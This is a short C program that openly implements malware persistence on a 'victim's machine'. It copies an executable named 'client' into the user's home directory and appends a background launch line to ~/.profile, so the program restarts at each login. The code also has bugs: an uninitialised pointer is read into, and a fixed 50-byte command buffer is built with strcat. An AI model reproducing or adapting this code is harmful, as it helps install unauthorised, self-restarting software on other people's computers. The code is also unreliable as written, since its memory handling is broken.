#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int presistence(char *get_path, FILE *fp )
{	
		
	char chunk[128];
	int len = strlen(get_path) -8;	
	get_path[len] = 0; //remove ".profile" from home path 
		
	//copy the executable to the home directory 	
	char command[50] = "cp client ";
	strcat(command, get_path);
	system(command);
		

	strcat(get_path, "client &");
	
	if(fp == NULL)
		{
		printf("ERROR\n");
		exit(1);
		}
	//check .profile if our command is already there
	while(fgets(chunk,sizeof(chunk),fp) != 0)
		{
		if(strstr(chunk,get_path) !=0)
			{				
			return 0;
			}		
		}	
	fprintf(fp,"%s \n",get_path);
	fclose(fp);
	

	return 0;
}
int main()
	{
	//get the .profile file path for the victim's machine 
	FILE *home_path = popen("echo $HOME/.profile","r");;
	char *get_path;
	fscanf(home_path, "%s", get_path);
	pclose(home_path);	

	FILE *profile  = fopen(get_path, "a+");		
	presistence(get_path, profile);

	return 0;
	}
